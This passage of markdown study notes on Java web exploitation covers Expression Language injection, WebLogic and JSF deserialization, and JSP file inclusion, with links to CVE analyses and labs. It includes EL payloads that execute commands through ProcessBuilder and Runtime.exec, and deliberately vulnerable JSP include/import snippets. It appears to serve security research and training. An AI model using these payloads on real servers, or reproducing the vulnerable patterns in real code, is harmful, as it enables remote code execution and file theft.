-Djavax.net.ssl.trustStore=client_truststore.jks
```

## Remote Code Execution (RCE) 
**Bugs**
- [Weblogic RCE by only one GET request — CVE-2020–14882 Analysis](https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf)
- [Bean Stalking: Growing Java beans into Remote Code Execution](https://github.blog/security/vulnerability-research/bean-stalking-growing-java-beans-into-remote-code-execution/)
- [Oracle Access Manager Pre-Auth RCE (CVE-2021–35587 Analysis)](https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316)
- [GHSL-2020-015: Remote Code Execution - Bypass of CVE-2018-16621 mitigations in Nexus Repository Manager](https://securitylab.github.com/advisories/GHSL-2020-015-nxrm-sonatype/)
- [GHSL-2020-012: Remote Code Execution - JavaEL Injection (high privileged accounts) in Nexus Repository Manager](https://securitylab.github.com/advisories/GHSL-2020-012-nxrm-sonatype/)
- [GHSL-2020-011: Remote Code Execution - JavaEL Injection (low privileged accounts) in Nexus Repository Manager](https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype/)


### Via EL
**EL payload must be concise**
- Must be a one-liner.
- Cannot call static methods directly.
- Starts from a variable in EL scope.

**Payload Examples**
Process Execution: Payload to create and start a new process (`touch /tmp/foobar`)
```java
#{"".getClass().forName("java.lang.ProcessBuilder").getConstructors()[1].newInstance("touch~/tmp/foobar".split("~")).start()}
```

Runtime Invocation: Payload to execute `xcalc` using `java.lang.Runtime`
```java
#{"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("xcalc")}
```

**Fine-Tuning EL Payloads**
- EL behavior varies across implementations.
- Constructor order in `getConstructors()` changes per JVM restart.
- Example to use EL to manipulate HTTP headers while referencing Java classes:

```java
${facesContext.getExternalContext().setResponseHeader("S0","".getClass().forName("java.lang.ProcessBuilder").getConstructors()[0].toString())}
```

## Deserialization Exploitation
**Oracle T3 Protocol Deserialization**
- CVE-2018-3245
	- Use the `JRMPClient` payload to establish a connection to a vulnerable WebLogic server.
	- Leverage `JRMPListener` to host malicious gadget chains.
	- Trigger deserialization to execute arbitrary code.
- CVE-2020-2555
	- RCE via `com.tangosol.util.extractor.ChainedExtractor` custom gadgets.
	- Create a custom gadget chain using `ChainedExtractor`.
	- Inject the payload into T3 communication to trigger deserialization.

**JSF ViewState**
- Tracks user session and serialized into forms as hidden fields.
    - Can be **encrypted** or **plaintext**, depending on configuration.
- Client-side ViewState:
    - Serialized session data transmitted in POST requests.
    - High overhead due to large request sizes.
- Server-side ViewState:
    - Serialized session ID transmitted.
    - Server reconstructs session from memory.

**LABS**
- [Lab: Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
- [Lab: Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

## Local File Inclusion (LFI)
**JSP Exploitation**
- The `include` and `import` functions in JSP are often used to dynamically include resources into a web application.

**`include` Function**
- Embeds the content of a local file into the JSP output.
- Attacker can include arbitrary files, e.g., `/etc/passwd`, application logs or application configuration files (e.g., `web.xml`, `.properties` files).
- Capabilities:
    - Can read files on the server but **cannot execute** them as JSP/Java code.
    - Restricted to local file paths.
- Example code:

```java
<c:if test="${not empty param.language}">  
    <jsp:include file="<%= request.getParameter('language') %>" />  
</c:if>
```

**`import` Function**
- Imports resources (files or URLs) and optionally executes them if they are executable scripts or JSP pages.
- Attacker can execute remote scripts hosted on their server, enabling Remote Code Execution (RCE).
- Local file execution is possible if the resource is an executable script (e.g., `.jsp`, `.sh`).
- Capabilities:
    - Can read and execute both **local** and **remote** resources.
    - Remote URL functionality makes it more dangerous than `include`.
- Example code:

```java
<c:import url="<%= request.getParameter('language') %>" />
```

**Bugs**
- [GHSL-2020-072: Arbitrary file disclosure in JinJava - CVE-2020-12668](https://securitylab.github.com/advisories/GHSL-2020-072-hubspot_jinjava/)

---
# What's Next?
- [How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM](https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/)
- [A Quick Look at CVE-2021–21985 VCenter Pre-Auth RCE](https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5)
- [Analysis of Pre-Auth RCE Vulnerability on ForgeRock AM (CVE-2021–35464)](https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-pre-auth-rce-tr%C3%AAn-forgerock-am-cve-2021-35464-e1d8fbc6aa83)
- [Atlassian Confluence Pre-Auth RCE (CVE-2021–26084) and the story of “blind spots” when finding bugs](https://testbnull.medium.com/atlassian-confluence-pre-auth-rce-cve-2021-26084-v%C3%A0-c%C3%A2u-chuy%E1%BB%87n-v%E1%BB%81-%C4%91i%E1%BB%83m-m%C3%B9-khi-t%C3%ACm-bug-43ab36b6c455)
- [Oracle Business Intelligence Miscellaneous part 1](https://testbnull.medium.com/linh-tinh-v%E1%BB%81-oracle-business-intelligence-part-1-5a050b48a193)
- [Quick note of vCenter RCE (CVE-2021–22005)](https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee)
- [Return of the Rhino — Analysis of MozillaRhino gadgetchain (also the writeup of HITB linkextractor)](https://testbnull.medium.com/return-of-the-rhino-analysis-of-mozillarhino-gadgetchain-also-the-writeup-of-hitb-linkextractor-a2074b4ae624)
- [Some notes about Xalan-J Integer Truncation (CVE-2022–34169)](https://testbnull.medium.com/some-notes-about-xalan-j-integer-truncation-cve-2022-34169-72c6bfbabefb)
- [GHSL-2023-045: LDAP injection in Bounty Castle For Java - CVE-2023-33201](https://securitylab.github.com/advisories/GHSL-2023-045_Bouncy_Castle_For_Java/)
- [GHSL-2022-024: Regular Expression Denial of Service (ReDoS) in the Azure SDK for Java](https://securitylab.github.com/advisories/GHSL-2022-024_Azure_SDK_for_Java/)
- [GHSL-2020-050: Arbitrary code execution in Pebble Templates](https://securitylab.github.com/advisories/GHSL-2020-050-pebble/)
- [GHSL-2020-048: Remote Code Execution in Apache Velocity - CVE-2020-13936](https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity/)